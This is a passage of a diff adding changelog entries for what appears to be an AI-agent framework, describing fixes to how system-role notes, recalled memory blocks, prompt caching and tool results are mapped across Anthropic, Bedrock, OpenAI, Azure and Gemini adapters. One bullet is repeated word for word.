+  just sent back.** The reply being sent back counted as the last turn
+  without tool calls, so the next iteration stopped before the model could
+  act on the feedback.
+- **A mid-run system note no longer replaces the agent's instructions on
+  Anthropic models.** The agent loop adds system-role notes partway through a
+  run (iteration-limit notice, grounding and verification reminders, the
+  final-answer nudge), and the Anthropic adapter sent the *last* system
+  message as `system` — so after the first note the model ran without its
+  real instructions. Every native adapter now maps system messages the same
+  way: the leading ones (instructions, then a recalled-memory block) form the
+  system prompt in order, and a later one stays at its position as user-role
+  guidance. On Anthropic and Bedrock it is a `<system-note>` text block in
+  the user turn there, merged with adjacent user turns so roles alternate and
+  tool results still open the turn after their tool calls; OpenAI, Azure and
+  Gemini keep their `[System guidance]` user note. With `prompt_cache=True`,
+  Anthropic marks both the instructions block and the last system block, so a
+  memory block that changes per turn does not cost the instructions their
+  cache hit. Bedrock no longer hoists mid-run notes into `system`, and now
+  sends parallel tool results in one user turn, as Converse requires. On
+  OpenAI-compatible endpoints a memory block now joins the opening system
+  message instead of becoming a user note before the prompt.
+
+- **A mid-run system note no longer replaces the agent's instructions on
+  Anthropic models.** The agent loop adds system-role notes partway through a
+  run (iteration-limit notice, grounding and verification reminders, the
+  final-answer nudge), and the Anthropic adapter sent the *last* system
+  message as `system` — so after the first note the model ran without its
+  real instructions. Every native adapter now maps system messages the same
+  way: the leading ones (instructions, then a recalled-memory block) form the
+  system prompt in order, and a later one stays at its position as user-role
+  guidance. On Anthropic and Bedrock it is a `<system-note>` text block in
+  the user turn there, merged with adjacent user turns so roles alternate and
+  tool results still open the turn after their tool calls; OpenAI, Azure and
+  Gemini keep their `[System guidance]` user note. With `prompt_cache=True`,
+  Anthropic marks both the instructions block and the last system block, so a
+  memory block that changes per turn does not cost the instructions their
+  cache hit. Bedrock no longer hoists mid-run notes into `system`, and now
+  sends parallel tool results in one user turn, as Converse requires. On
+  OpenAI-compatible endpoints a memory block now joins the opening system
+  message instead of becoming a user note before the prompt.
+
 ## [2.18.3] - 2026-09-29
 
 ### Added
